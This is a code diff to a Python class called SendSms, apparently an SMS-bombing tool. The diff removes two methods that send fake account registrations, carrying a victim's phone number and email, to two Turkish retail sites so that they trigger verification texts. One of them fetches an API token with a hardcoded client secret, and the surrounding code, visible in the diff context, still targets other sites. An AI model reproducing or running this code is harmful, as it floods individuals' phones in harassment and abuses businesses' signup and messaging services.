@@ -102,25 +102,7 @@ class SendSms():
         
 
     # kigili.com
-    def Kigili(self):    
-        try:
-            kigili = requests.post("https://www.kigili.com/users/registration/", data={
-                "first_name": "Memati",
-                "last_name": "Bas",
-                "email": self.mail,
-                "phone": f"0{self.phone}",
-                "password": "31ABC..abc31",
-                "confirm": "true",
-                "kvkk": "true",
-                "next": ""
-            })
-            if kigili.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> kigili.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> kigili.com")
+    
         
 
     #kahvedunyasi.com
@@ -653,21 +635,7 @@ class SendSms():
 
 
     #e-bebek.com
-    def Ebebek(self):
-        try:
-            r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
-            auth = (r.json()["access_token"])
-            url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
-            headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
-            json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": self.phone}
-            r = requests.post(url, headers=headers, json=json)
-            if r.json()["status"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api2.e-bebek.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api2.e-bebek.com")
+    
 
 
     #sakasu.com.tr
